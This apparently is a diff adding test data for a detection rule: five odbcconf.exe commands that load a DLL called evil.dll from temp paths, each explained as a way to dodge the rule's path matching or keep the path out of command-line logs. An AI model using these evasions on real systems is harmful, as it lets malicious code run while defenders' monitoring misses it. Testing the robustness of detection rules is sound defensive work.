@@ -1,0 +1,22 @@
+[
+  {
+    "output": "odbcconf.exe /A {INSTALLDRIVER \"MyDriver|C:\\Windows\\Temp\\\\evil.dll\"}",
+    "explanation": "Insertion technique. Injects an extra backslash character (`\\\\`) into the path component string (`\\Temp\\\\`). This disrupts the exact string matching for `:\\Windows\\Temp\\` and `:\\Temp\\` inside the `selection_cli` block, while the native Windows file subsystem collapses multiple consecutive backslashes into a single delimiter during execution."
+  },
+  {
+    "output": "odbcconf.exe /A {INSTALLDRIVER \"MyDriver|C:/Windows/Temp/evil.dll\"}",
+    "explanation": "Substitution technique. Replaces standard Windows backslashes (`\\`) with forward slashes (`/`) in the target path argument. This evades the `selection_cli` check which explicitly relies on backslash prefixes/suffixes like `:\\Windows\\Temp\\` and `:\\Temp\\`, whereas the Windows path-handling APIs natively treat forward slashes as valid separators."
+  },
+  {
+    "output": "odbcconf.exe /A {INSTALLDRIVER \"MyDriver|..\\..\\Windows\\Temp\\evil.dll\"}",
+    "explanation": "Recoding / Encoding technique. Uses relative path traversal sequences (`..\\..\\`) to specify the destination folder. This completely avoids matching absolute drive-anchored paths (such as `:\\Windows\\Temp\\` or `:\\Temp\\`) inside the rule's `selection_cli` logic, while the runtime engine successfully resolves the relative link to the target binary."
+  },
+  {
+    "output": "odbcconf.exe /A {INSTALLDRIVER \"MyDriver|\\\\?\\C:\\Windows\\Temp\\evil.dll\"}",
+    "explanation": "Insertion / Recoding technique. Prepends the Win32 device namespace prefix (`\\\\?\\`) to the absolute drive path. This modifies the beginning of the string boundary to prevent matching `:\\Windows\\Temp\\`, while the underlying Windows APIs transparently accept the prefix to bypass normal path length restrictions and processing rules."
+  },
+  {
+    "output": "odbcconf.exe /F C:\\Temp\\response_file.rsp",
+    "explanation": "Other technique (Response File Indirect Execution). Relocates the malicious path syntax into a separate configuration response script file (`/F`) rather than exposing it on the raw command line. This completely purges the suspicious paths from the process creation `CommandLine` log field, blinding the current rule's detection visibility entirely."
+  }
+]
